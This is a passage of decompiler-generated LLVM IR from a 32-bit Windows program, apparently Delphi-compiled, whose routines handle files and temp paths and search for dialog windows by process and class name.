  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1665
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1666
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1667
  br i1 %9, label %dec_label_pc_406ec5, label %dec_label_pc_406e46, !insn.addr !1667

dec_label_pc_406e46:                              ; preds = %dec_label_pc_406e0a
  %10 = call i32 @"@LStrClr"(), !insn.addr !1668
  %11 = call i32 @function_403c90(), !insn.addr !1669
  %12 = icmp slt i32 %11, 0, !insn.addr !1670
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1671
  br i1 %12, label %dec_label_pc_406e90, label %dec_label_pc_406e5e, !insn.addr !1671

dec_label_pc_406e5e:                              ; preds = %dec_label_pc_406e46
  %13 = add i32 %11, 1, !insn.addr !1672
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1673
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1673
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1673
  br label %dec_label_pc_406e61, !insn.addr !1673

dec_label_pc_406e61:                              ; preds = %dec_label_pc_406e61, %dec_label_pc_406e5e
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1674
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1674
  store i32 0, i32* %15, align 4, !insn.addr !1674
  %16 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1675
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1676
  %18 = add i32 %16, %17, !insn.addr !1676
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1676
  %20 = load i32, i32* %19, align 4, !insn.addr !1676
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1676
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1676
  store i32 %20, i32* %22, align 4, !insn.addr !1676
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1677
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1677
  store i32 ptrtoint (i32* @global_var_406f0c to i32), i32* %24, align 4, !insn.addr !1677
  %25 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1678
  %26 = or i32 %17, 4, !insn.addr !1679
  %27 = add i32 %25, %26, !insn.addr !1679
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1679
  %29 = load i32, i32* %28, align 4, !insn.addr !1679
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1679
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1679
  store i32 %29, i32* %31, align 4, !insn.addr !1679
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1680
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1680
  store i32 ptrtoint ([3 x i8]* @global_var_406f18 to i32), i32* %33, align 4, !insn.addr !1680
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1681
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1682
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1683
  %37 = icmp eq i32 %36, 0, !insn.addr !1683
  %38 = icmp eq i1 %37, false, !insn.addr !1684
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1684
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1684
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1684
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1684
  br i1 %38, label %dec_label_pc_406e61, label %dec_label_pc_406e90, !insn.addr !1684

dec_label_pc_406e90:                              ; preds = %dec_label_pc_406e61, %dec_label_pc_406e46
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1665
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1685
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1686
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1686
  store i32 0, i32* %42, align 4, !insn.addr !1686
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1687
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1687
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1687
  store i32 %45, i32* %44, align 4, !insn.addr !1687
  %46 = call i32 @function_4034c8(), !insn.addr !1688
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1689
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1689
  store i32 %46, i32* %48, align 4, !insn.addr !1689
  %49 = call i32 @function_403720(), !insn.addr !1690
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1691
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1691
  store i32 %49, i32* %51, align 4, !insn.addr !1691
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1692
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1692
  store i32 %39, i32* %53, align 4, !insn.addr !1692
  %54 = call i32 @function_40446c(), !insn.addr !1693
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1694
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1694
  store i32 %39, i32* %56, align 4, !insn.addr !1694
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1695
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1696
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1696
  store i32 %39, i32* %59, align 4, !insn.addr !1696
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1697
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1698
  br label %dec_label_pc_406ec5, !insn.addr !1698

dec_label_pc_406ec5:                              ; preds = %dec_label_pc_406e90, %dec_label_pc_406e0a, %dec_label_pc_406ddc
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1699
  %62 = load i32, i32* %61, align 4, !insn.addr !1699
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1700
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1701
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1701
  store i32 4222695, i32* %64, align 4, !insn.addr !1701
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1702
  ret i32 %65, !insn.addr !1703
}

define i32 @function_406ee0() local_unnamed_addr {
dec_label_pc_406ee0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1704
  ret i32 %0, !insn.addr !1704
}

define i32 @function_406ee5() local_unnamed_addr {
dec_label_pc_406ee5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1705
}

define i32 @function_406ee7(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ee7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1706
}

define i32 @function_406f1c() local_unnamed_addr {
dec_label_pc_406f1c:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1707
  %1 = call i32 @function_4036b8(), !insn.addr !1708
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1709
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1709
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1709
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1710
  %4 = call i32 @function_403c90(), !insn.addr !1711
  %5 = icmp slt i32 %4, 0, !insn.addr !1712
  br i1 %5, label %dec_label_pc_406fa4, label %dec_label_pc_406f72, !insn.addr !1713

dec_label_pc_406f72:                              ; preds = %dec_label_pc_406f1c
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1714
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1715
  br label %dec_label_pc_406ff0

dec_label_pc_406fa4:                              ; preds = %dec_label_pc_406f1c
  %8 = call i32 @function_403c88(), !insn.addr !1716
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1717
  %10 = call i32 @function_403c90(), !insn.addr !1718
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1719
  %12 = call i32 @function_403c90(), !insn.addr !1720
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1721
  %14 = call i32 @function_406ddc(), !insn.addr !1722
  br label %dec_label_pc_406ff0, !insn.addr !1722

dec_label_pc_406ff0:                              ; preds = %dec_label_pc_406f72, %dec_label_pc_406fa4
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1723
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1724
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1725
  ret i32 %16, !insn.addr !1726
}

define i32 @function_40700b() local_unnamed_addr {
dec_label_pc_40700b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1727
  ret i32 %0, !insn.addr !1727
}

define i32 @function_407010() local_unnamed_addr {
dec_label_pc_407010:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1728
}

define i32 @function_407012(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407012:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1729
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1729
  %3 = load i32, i32* %2, align 4, !insn.addr !1729
  ret i32 %3, !insn.addr !1730
}

define i32 @function_40701c() local_unnamed_addr {
dec_label_pc_40701c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1731
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1731
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1731
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1732
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1733
  %3 = add i32 %2, 1, !insn.addr !1733
  %4 = icmp eq i32 %3, 0, !insn.addr !1733
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1733
  %5 = icmp eq i1 %4, false, !insn.addr !1734
  br i1 %5, label %dec_label_pc_407054, label %dec_label_pc_407035, !insn.addr !1734

dec_label_pc_407035:                              ; preds = %dec_label_pc_40701c
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1735
  %7 = icmp eq i32 %6, 0, !insn.addr !1735
  br i1 %7, label %dec_label_pc_407044, label %dec_label_pc_40703f, !insn.addr !1736

dec_label_pc_40703f:                              ; preds = %dec_label_pc_407035
  %8 = call i32 @function_406ddc(), !insn.addr !1737
  br label %dec_label_pc_407044, !insn.addr !1737

dec_label_pc_407044:                              ; preds = %dec_label_pc_40703f, %dec_label_pc_407035
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1738
  br label %dec_label_pc_407054, !insn.addr !1738

dec_label_pc_407054:                              ; preds = %dec_label_pc_407044, %dec_label_pc_40701c
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1739
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1740
  ret i32 0, !insn.addr !1741
}

define i32 @function_407062() local_unnamed_addr {
dec_label_pc_407062:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1742
  ret i32 %0, !insn.addr !1742
}

define i32 @function_407067() local_unnamed_addr {
dec_label_pc_407067:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1743
}

define i32 @function_407069(i32 %arg1) local_unnamed_addr {
dec_label_pc_407069:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1744
}

define i32 @function_40706c() local_unnamed_addr {
dec_label_pc_40706c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1745
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1745
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1745
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1746
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1747
  %3 = add i32 %2, -1, !insn.addr !1747
  %4 = icmp eq i32 %2, 0, !insn.addr !1747
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1747
  %5 = icmp eq i1 %4, false, !insn.addr !1748
  br i1 %5, label %dec_label_pc_4070a0, label %dec_label_pc_407086, !insn.addr !1748

dec_label_pc_407086:                              ; preds = %dec_label_pc_40706c
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1749
  br label %dec_label_pc_4070a0, !insn.addr !1750

dec_label_pc_4070a0:                              ; preds = %dec_label_pc_407086, %dec_label_pc_40706c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1751
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1752
  ret i32 0, !insn.addr !1753
}

define i32 @function_4070ae() local_unnamed_addr {
dec_label_pc_4070ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1754
  ret i32 %0, !insn.addr !1754
}

define i32 @function_4070b3() local_unnamed_addr {
dec_label_pc_4070b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1755
}

define i32 @function_4070b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4070b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1756
}

define i1 @function_4070b8(i8* %pszPath) local_unnamed_addr {
dec_label_pc_4070b8:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1757
  ret i1 %0, !insn.addr !1757
}

define i32 @function_4070c0() local_unnamed_addr {
dec_label_pc_4070c0:
  %eax.0.reg2mem = alloca i32, !insn.addr !1758
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1759
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1760
  %2 = icmp eq i32 %1, 0, !insn.addr !1761
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1762
  br i1 %2, label %dec_label_pc_4070f6, label %dec_label_pc_4070d8, !insn.addr !1762

dec_label_pc_4070d8:                              ; preds = %dec_label_pc_4070c0
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1759
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1763
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1763
  %7 = load i8, i8* %6, align 1, !insn.addr !1763
  %8 = icmp eq i8 %7, 92, !insn.addr !1763
  br i1 %8, label %dec_label_pc_4070e8, label %dec_label_pc_4070df, !insn.addr !1764

dec_label_pc_4070df:                              ; preds = %dec_label_pc_4070d8
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1765
  store i8 92, i8* %9, align 1, !insn.addr !1765
  %10 = or i32 %3, 1, !insn.addr !1766
  %11 = add i32 %1, %10, !insn.addr !1766
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1766
  store i8 0, i8* %12, align 1, !insn.addr !1766
  br label %dec_label_pc_4070e8, !insn.addr !1766

dec_label_pc_4070e8:                              ; preds = %dec_label_pc_4070df, %dec_label_pc_4070d8
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1767
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1767
  br label %dec_label_pc_4070f6, !insn.addr !1767

dec_label_pc_4070f6:                              ; preds = %dec_label_pc_4070e8, %dec_label_pc_4070c0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1768
}

define i32 @function_407100(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407100:
  %esp.0.reg2mem = alloca i32, !insn.addr !1769
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1770
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1771
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1771
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1771
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1772
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1773
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1773
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1774
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1774
  %5 = icmp eq i1 %4, false, !insn.addr !1775
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1776
  br i1 %5, label %dec_label_pc_4071b7, label %dec_label_pc_407137, !insn.addr !1776

dec_label_pc_407137:                              ; preds = %dec_label_pc_407100
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1777
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1777
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1778
  %8 = icmp eq i32 %7, 32770, !insn.addr !1779
  %9 = icmp eq i1 %8, false, !insn.addr !1780
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1780
  br i1 %9, label %dec_label_pc_4071b7, label %dec_label_pc_407146, !insn.addr !1780

dec_label_pc_407146:                              ; preds = %dec_label_pc_407137
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1781
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1781
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1782
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1782
  %13 = add i32 %arg1, 4, !insn.addr !1783
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1783
  %15 = load i32, i32* %14, align 4, !insn.addr !1783
  %16 = icmp eq i32 %15, %12, !insn.addr !1783
  %17 = icmp eq i1 %16, false, !insn.addr !1784
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1784
  br i1 %17, label %dec_label_pc_4071b7, label %dec_label_pc_407151, !insn.addr !1784

dec_label_pc_407151:                              ; preds = %dec_label_pc_407146
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1785
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1785
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1786
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1787
  %21 = load i32, i32* %20, align 4, !insn.addr !1787
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1788
  %23 = icmp eq i32 %21, %22, !insn.addr !1788
  %24 = icmp eq i1 %23, false, !insn.addr !1789
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1789
  br i1 %24, label %dec_label_pc_4071b7, label %dec_label_pc_407162, !insn.addr !1789

dec_label_pc_407162:                              ; preds = %dec_label_pc_407151
  %25 = add i32 %arg1, 8, !insn.addr !1790
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1790
  %27 = load i32, i32* %26, align 4, !insn.addr !1790
  %28 = icmp eq i32 %27, 0, !insn.addr !1790
  br i1 %28, label %dec_label_pc_40718c, label %dec_label_pc_407168, !insn.addr !1791

dec_label_pc_407168:                              ; preds = %dec_label_pc_407162
  %29 = call i32 @function_4072d8(), !insn.addr !1792
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1793
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1794
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_4071b7

dec_label_pc_40718c:                              ; preds = %dec_label_pc_407162
  %32 = add i32 %arg1, 12, !insn.addr !1795
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1795
  %34 = load i32, i32* %33, align 4, !insn.addr !1795
  %35 = add i32 %arg1, 16, !insn.addr !1796
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1796
  %37 = load i32, i32* %36, align 4, !insn.addr !1796
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1797
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1797
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1797
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1797
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1797
  %43 = add i32 %arg1, 24, !insn.addr !1798
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1798
  store i32 %42, i32* %44, align 4, !insn.addr !1798
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1799
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1799
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1800
  %47 = icmp eq i1 %46, false, !insn.addr !1801
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1802
  br i1 %47, label %dec_label_pc_4071b7, label %dec_label_pc_4071b2, !insn.addr !1802

dec_label_pc_4071b2:                              ; preds = %dec_label_pc_40718c
  %48 = add i32 %arg1, 20, !insn.addr !1803
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1803
  store i32 %arg2, i32* %49, align 4, !insn.addr !1803
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1804
  br label %dec_label_pc_4071b7, !insn.addr !1804

dec_label_pc_4071b7:                              ; preds = %dec_label_pc_407168, %dec_label_pc_4071b2, %dec_label_pc_40718c, %dec_label_pc_407151, %dec_label_pc_407146, %dec_label_pc_407137, %dec_label_pc_407100
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1805
  %51 = load i32, i32* %50, align 4, !insn.addr !1805
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1806
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1807
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1807
  store i32 4223449, i32* %53, align 4, !insn.addr !1807
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1808
  ret i32 %54, !insn.addr !1809
}

define i32 @function_4071d2() local_unnamed_addr {
dec_label_pc_4071d2:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1810
  ret i32 %0, !insn.addr !1810
}

define i32 @function_4071d7() local_unnamed_addr {
dec_label_pc_4071d7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1811
}

define i32 @function_4071d9(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4071d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1812
}

define i32 @function_4071e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4071e4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1813
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1814
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1815
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1815
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1815
  %6 = call i32 @function_40441c(), !insn.addr !1816
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1817
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1818
  br label %dec_label_pc_407228, !insn.addr !1818

dec_label_pc_407228:                              ; preds = %dec_label_pc_407247, %dec_label_pc_4071e4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1817
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1817
  store i32 %7, i32* %9, align 4, !insn.addr !1817
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1819
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1819
  store i32 4223232, i32* %11, align 4, !insn.addr !1819
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1820
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1821
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1821
  store i32 1, i32* %14, align 4, !insn.addr !1821
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1822
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1823
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1823
  store i32 0, i32* %16, align 4, !insn.addr !1823
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1824
  %18 = icmp eq i1 %17, false, !insn.addr !1825
  %19 = icmp eq i1 %18, false, !insn.addr !1826
  br i1 %19, label %dec_label_pc_407252, label %dec_label_pc_407247, !insn.addr !1826

dec_label_pc_407247:                              ; preds = %dec_label_pc_407228
  %20 = call i32 @function_40441c(), !insn.addr !1827
  %21 = sub i32 %20, %6, !insn.addr !1828
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1829
  %23 = icmp eq i1 %22, false, !insn.addr !1830
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1830
  br i1 %23, label %dec_label_pc_407228, label %dec_label_pc_407252, !insn.addr !1830

dec_label_pc_407252:                              ; preds = %dec_label_pc_407247, %dec_label_pc_407228
  ret i32 0, !insn.addr !1831
}

define i32 @function_40726c() local_unnamed_addr {
dec_label_pc_40726c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1832
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1833
}

define i32 @function_407284(i32 %arg1) local_unnamed_addr {
dec_label_pc_407284:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1834
  %edi.0.reg2mem = alloca i32, !insn.addr !1834
  %ecx.0.reg2mem = alloca i32, !insn.addr !1834
  %0 = call i1 @__decompiler_undefined_function_4()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1835
  br label %2, !insn.addr !1835

; <label>:2:                                      ; preds = %4, %dec_label_pc_407284
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1835
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1835
  br i1 %3, label %10, label %4, !insn.addr !1835

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1835
  %6 = load i8, i8* %5, align 1, !insn.addr !1835
  %7 = icmp eq i8 %6, 0, !insn.addr !1835
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1835
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1835
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1835
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1835
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1835
  br i1 %7, label %10, label %2, !insn.addr !1835

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1836
  ret i32 %11, !insn.addr !1837
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_4072d8() local_unnamed_addr {
dec_label_pc_4072d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1838
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1839
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1839
  %4 = add i32 %3, %1, !insn.addr !1840
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1840
  store i8 0, i8* %5, align 1, !insn.addr !1840
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1841
  ret i32 %6, !insn.addr !1842
}

define i32 @function_40730c() local_unnamed_addr {
dec_label_pc_40730c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1843
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1844
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1845
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1845
  %6 = add i32 %5, %3, !insn.addr !1846
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1846
  store i8 0, i8* %7, align 1, !insn.addr !1846
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1847
  ret i32 %8, !insn.addr !1848
}

define i32 @function_407344() local_unnamed_addr {
dec_label_pc_407344:
  %0 = call i32 @function_4034c8(), !insn.addr !1849
  %1 = call i32 @function_4034c8(), !insn.addr !1850
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1851
  ret i32 %2, !insn.addr !1852
}

define i32 @function_407384() local_unnamed_addr {
dec_label_pc_407384:
  %0 = call i32 @function_4034c8(), !insn.addr !1853
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1854
  ret i32 %1, !insn.addr !1855
}

